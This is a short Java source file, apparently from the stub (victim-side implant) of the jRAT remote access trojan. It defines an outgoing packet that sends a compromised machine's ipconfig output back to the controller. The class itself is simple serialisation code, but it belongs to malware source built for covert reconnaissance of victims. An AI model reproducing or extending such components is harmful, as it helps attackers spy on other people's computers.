package se.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;

import se.jrat.common.io.StringWriter;


public class Packet50IPConfig extends AbstractOutgoingPacket {

	private String ipconfig;

	public Packet50IPConfig(String ipconfig) {
		this.ipconfig = ipconfig;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(ipconfig);
	}

	@Override
	public byte getPacketId() {
		return 50;
	}

}